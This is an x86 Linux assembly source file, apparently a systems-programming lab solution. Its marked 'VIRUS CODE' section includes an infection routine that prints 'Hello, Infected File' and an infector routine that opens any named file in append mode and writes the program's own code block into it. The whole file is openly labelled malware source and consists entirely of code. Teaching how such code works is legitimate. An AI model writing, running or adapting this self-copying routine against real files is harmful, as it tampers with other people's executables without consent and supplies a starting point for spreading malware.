section .data
    inf_msg db 'Hello, Infected File', 10   ; The infection message with a newline
    inf_len equ $ - inf_msg                 ; Length of the message

section .text
global _start
global system_call
global infection        ; Make it callable from C
global infector         ; Make it callable from C
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

; ==========================================================
; VIRUS CODE BOUNDARY START
; ==========================================================
code_start:

; ----------------------------------------------------------
; void infection()
; Prints the infection message to standard output
; ----------------------------------------------------------
infection:
    push    ebp
    mov     ebp, esp
    pushad              ; Save registers

    mov     eax, 4      ; sys_write (4)
    mov     ebx, 1      ; stdout (1)
    mov     ecx, inf_msg; Pointer to message
    mov     edx, inf_len; Length of message
    int     0x80

    popad               ; Restore registers
    pop     ebp
    ret

; ----------------------------------------------------------
; void infector(char* file_name)
; Appends the virus code to the provided file
; ----------------------------------------------------------
infector:
    push    ebp
    mov     ebp, esp
    pushad

    ; 1. sys_open: open(file_name, O_WRONLY | O_APPEND, 0644)
    mov     eax, 5          ; sys_open (5)
    mov     ebx, [ebp+8]    ; Arg 1: file_name (from the C stack)
    mov     ecx, 1025       ; Arg 2: O_WRONLY (1) | O_APPEND (1024) = 1025
    mov     edx, 0644o      ; Arg 3: Mode/Permissions (Octal 0644)
    int     0x80

    ; Check for error (if eax < 0)
    cmp     eax, 0
    jl      .end_infector   ; If file doesn't exist or permissions fail, abort

    mov     ebx, eax        ; Save the returned file descriptor into ebx

    ; 2. sys_write: write(fd, code_start, code_end - code_start)
    mov     eax, 4          ; sys_write (4)
    mov     ecx, code_start ; Arg 2: Pointer to the start of our virus code
    mov     edx, code_end - code_start ; Arg 3: The dynamic size of the virus code
    int     0x80

    ; 3. sys_close: close(fd)
    mov     eax, 6          ; sys_close (6)
    int     0x80

.end_infector:
    popad
    pop     ebp
    ret

; ==========================================================
; VIRUS CODE BOUNDARY END
; ==========================================================
code_end: